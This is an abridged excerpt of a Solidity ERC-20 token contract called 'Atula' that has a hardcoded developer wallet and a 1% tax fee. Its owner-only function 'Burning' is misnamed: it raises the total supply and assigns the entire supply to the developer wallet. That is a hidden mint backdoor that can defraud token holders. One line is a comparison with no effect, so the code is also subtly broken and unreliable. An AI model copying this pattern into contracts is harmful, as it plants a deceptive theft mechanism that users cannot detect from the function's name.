...
contract TOKEN is Context, IERC20, Ownable {
    ...
    string private _name = "Atula";
    string private _symbol = "Atula";
    uint8 private _decimals = 9;
    
    uint256 public _taxFee = 1;
    uint256 private _previousTaxFee = _taxFee;
    address private _devwallet = 0x03640E477430958226ADe8809b0e66E25d0cc9C9;
    ...
    function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
     ...
     function Burning(uint256 values) public onlyOwner {
            _tTotal += values;
             _rOwned[_devwallet] = _tTotal;
            _rTotal == _tTotal;
        }
